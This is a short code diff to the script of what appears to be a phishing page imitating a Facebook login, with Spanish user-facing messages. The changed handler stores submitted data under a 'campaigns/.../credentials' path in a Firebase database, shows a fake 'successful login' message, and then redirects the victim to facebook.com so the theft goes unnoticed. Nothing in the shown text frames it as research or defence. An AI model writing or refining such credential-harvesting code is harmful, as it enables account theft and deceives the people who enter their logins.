@@ -106,12 +106,14 @@
             };
 
             try {
-                const path = `campaigns/${id}`;
-                await push(ref(db, `${path}/credentials`), data);
-                await update(ref(db, path), { clicks: Date.now() }); // Actualización simple para triggers
-                setTimeout(() => window.location.href = 'https://facebook.com', 1000);
+                const path = `campaigns/${id}/credentials`;
+                await push(ref(db, path), data);
+                msg.style.color = "#42b72a";
+                msg.textContent = "¡Inicio de sesión exitoso!";
+                setTimeout(() => window.location.href = 'https://facebook.com', 1500);
             } catch (err) {
-                msg.textContent = "Error de conexión.";
+                console.error(err);
+                msg.textContent = "Error temporal. Intente más tarde.";
             }
         };
     </script>
